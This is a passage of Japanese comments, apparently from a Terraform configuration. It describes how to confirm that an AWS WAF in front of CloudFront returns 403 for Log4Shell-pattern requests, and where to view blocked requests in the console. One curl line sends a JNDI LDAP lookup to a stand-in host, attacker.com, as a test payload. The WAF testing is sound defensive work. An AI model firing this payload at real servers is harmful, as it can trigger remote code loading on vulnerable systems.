...
#
# 【確認ポイント】
# Log4Shell パターンを含むリクエストが WAF でブロック（403）されることを確認する。
#
#   DOMAIN=$(terraform output -raw cloudfront_domain_name)
#   curl -si -H 'User-Agent: ${jndi:ldap://attacker.com/a}' "https://${DOMAIN}/index.html" | head -3
#   # → HTTP/2 403
#
...
#   # → HTTP/2 200
#
# マネジメントコンソール → WAF & Shield → Web ACLs → 該当 ACL → ダッシュボード で
# ブロックされたリクエストの詳細（ルール名・マッチ理由など）を確認できる。
# =============================================================================
